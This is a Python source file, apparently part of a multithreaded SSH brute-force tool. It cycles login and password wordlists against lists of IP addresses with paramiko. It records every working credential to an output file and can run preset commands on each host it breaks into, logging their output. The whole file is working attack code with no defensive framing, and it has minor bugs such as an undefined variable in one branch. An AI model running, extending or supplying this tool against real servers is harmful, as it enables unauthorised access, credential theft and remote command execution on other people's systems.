from scripts.helpers import Threads, get_good_ips, prepare, show_brute_statistics
from termcolor import colored
import paramiko
import os

ENV: dict
LOGINS: list
PASSWORDS: list

threads: Threads
current_work_ips: list
current_creds: list
worked_ips: list
good_ips: list

def execute(client: paramiko.SSHClient, command: str):
    return client.exec_command(command)

def make_connection(ip: str, number: int, env):
    global current_creds, worked_ips, good_ips
    state = True
    for login in LOGINS:
        if state:
            for password in PASSWORDS:
                if state:
                    current_creds[number] = [login, password]
                    
                    show_brute_statistics(current_work_ips, current_creds, worked_ips, good_ips)
                    
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        client.connect(
                            hostname=ip,
                            port=int(env['PORT']),
                            username=login,
                            password=password,
                            timeout=5
                        )
                    except Exception as error:
                        with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_ERRORS"]}', 'a') as errors:
                            errors.write(str(error) + '\n')
                    else:
                        with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS"]}', 'a') as found:
                            found.write(ip + f' | {login}:{password}\n')
                        
                        if ENV['ALLOW_COMMANDS'] == 'true':
                            commands = ENV['COMMANDS'].split(',')
                            
                            with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS_EXTENDED"]}', 'a') as founde:
                                founde.write(f'[IP ADDRESS] {ip}\n\n')
                            
                            for command in commands:
                                stdin, stdout, stderr = execute(client, command)
                                with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS_EXTENDED"]}', 'a') as founde:
                                    founde.write(f'[{str(command).upper()}] {stdout.read().decode()}\n')
                                    
                            with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS_EXTENDED"]}', 'a') as founde:
                                founde.write('-----\n')
                        good_ips.append(ip)
                        state = False
                        break
                    client.close()
    worked_ips.append(ip)
    show_brute_statistics(current_work_ips, current_creds, worked_ips, good_ips)

def connect(ips: list, number: int, env):
    global current_work_ips
    for ip in ips:
        if type(ip) == list:
            for one_ip in ip:
                current_work_ips[number] = one_ip
                make_connection(one_ip, number, env)
        else:
            current_work_ips[number] = ip
            make_connection(one_ip, number, env)

def start(env, arguments):
    global ENV, LOGINS, PASSWORDS, threads, current_work_ips, current_creds, worked_ips, good_ips
    LOGINS, PASSWORDS, threads, current_work_ips, current_creds, worked_ips, good_ips = prepare(env, arguments)
    ENV = env
    print('PREPARED TO WORK')
    print('CREATING IPS LIST')
    ips = get_good_ips(env)
    print(colored('[INFO] IPS LIST IS READY', 'green'))
    print(colored('[INFO] STARTING CONNECTIONS...', 'green'))
    print(colored('[INFO] PREPARED TO WORK', 'green'))
    print(colored('[INFO] CREATING IPS LIST', 'green'))
    print(colored('[INFO] IPS LIST IS READY', 'green'))
    print(colored('[INFO] STARTING CONNECTIONS...', 'green'))
    
    start: int = 0
    part: int = len(ips) // ENV["THREADS"]
    end: int = part + ENV["THREADS"] - 1
    for i in range(ENV['THREADS']):
        threads.jobs.append([connect, [ips[start:end]], i, env])
        start, end = end, end + part
    
    threads.run()
    
    print(colored('CONNECTIONS ARE ENDED', 'green'))
    print(colored('MAKING BACKUPS', 'green'))
    os.system(f'cp {env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS"]} {env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS"]}.backup')
    os.system(f'cp {env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS_EXTENDED"]} {env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS_EXTENDED"]}.backup')
    os.system(f'cp {env["OUTPUT_FOLDER"]}{env["FILENAME_ERRORS"]} {env["OUTPUT_FOLDER"]}{env["FILENAME_ERRORS"]}.backup')

if __name__ == '__main__':
    print(colored('[WARNING] PLEASE LAUNCH ssh_brute.py', 'red'))
